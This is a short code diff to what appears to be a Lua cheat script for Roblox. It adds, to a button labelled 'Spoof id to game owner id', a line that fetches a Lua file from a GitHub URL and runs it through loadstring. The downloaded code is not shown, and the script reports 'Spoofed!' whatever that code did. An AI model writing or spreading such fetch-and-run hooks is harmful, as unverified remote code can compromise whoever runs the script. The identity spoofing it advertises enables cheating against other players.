@@ -33,7 +33,7 @@ end)
 btns:Seperator()
 
 btns:Button("Spoof id to game owner id", function()
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tamarixr/tamhub/main/ofajkjga.lua",true))()
 DiscordLib:Notification("Notification", "Spoofed!", "Okay!")
 end)
 
